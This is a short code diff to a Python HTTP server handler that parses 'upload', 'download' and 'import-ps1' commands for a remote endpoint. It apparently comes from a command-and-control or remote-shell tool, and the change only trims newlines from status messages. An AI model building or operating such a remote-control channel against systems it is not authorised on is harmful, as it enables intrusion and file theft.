@@ -172,7 +172,7 @@ class MyServer(BaseHTTPRequestHandler):
                         local_path = args[1]
                         remote_path = args[2]
                         command = "upload " + args[1] + "!" + args[2]
-                        print(colored(f"[+] Uploading {local_path} in {remote_path}..\n","green"))
+                        print(colored(f"[+] Uploading {local_path} in {remote_path}..","green"))
 
                 if "download" in command.split()[0]:
                     args = oslex.split(command)
@@ -183,7 +183,7 @@ class MyServer(BaseHTTPRequestHandler):
                         remote_path = args[1]
                         local_path = args[2]
                         command = "download " + args[1] + "!" + args[2]
-                        print(colored(f"[+] Downloading {remote_path} in {local_path}..\n","green"))
+                        print(colored(f"[+] Downloading {remote_path} in {local_path}..","green"))
 
                 if "import-ps1" in command.split()[0]:
                     args = oslex.split(command)
